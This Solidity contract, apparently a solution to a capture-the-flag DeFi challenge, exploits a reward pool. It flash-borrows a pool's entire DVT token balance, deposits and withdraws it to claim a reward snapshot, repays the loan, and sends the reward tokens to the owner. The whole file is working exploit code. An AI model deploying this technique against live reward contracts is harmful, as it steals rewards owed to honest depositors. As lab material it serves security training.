// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external;
}

contract AttackRewarder {
    using Address for address payable;
    address payable public owner;

    IERC20 public immutable DVTtoken;
    IERC20 public immutable RWDtoken;

    address payable private rewarderPool;
    IRewarderPool public rewarderPoolInterface;

    address payable private flashLoanerPool;
    IFlashLoanerPool public flashLoanerPoolInterface;

    constructor(
        address DVTtokenAddress,
        address RewardTokenAddress,
        address payable flashLoanerPoolAddress,
        address payable rewarderPoolAddress
    ) {
        DVTtoken = IERC20(DVTtokenAddress);
        RWDtoken = IERC20(RewardTokenAddress);

        flashLoanerPool = flashLoanerPoolAddress;
        flashLoanerPoolInterface = IFlashLoanerPool(flashLoanerPool);

        rewarderPool = rewarderPoolAddress;
        rewarderPoolInterface = IRewarderPool(rewarderPool);
        owner = payable(msg.sender);
    }

    function receiveFlashLoan(uint256 amount) public {
        // approve rewarderPoolInterface to spend this contracts DVT tokens
        DVTtoken.approve(rewarderPool, amount);
        // Deposit
        rewarderPoolInterface.deposit(amount);
        // Withdraw
        rewarderPoolInterface.withdraw(amount);
        // Repay to flashLoanerPool
        DVTtoken.transfer(flashLoanerPool, amount);
    }

    function attack() public {
        flashLoanerPoolInterface.flashLoan(DVTtoken.balanceOf(flashLoanerPool));
        // // Send all reward tokens to owner
        RWDtoken.transfer(owner, RWDtoken.balanceOf(address(this)));
    }
}
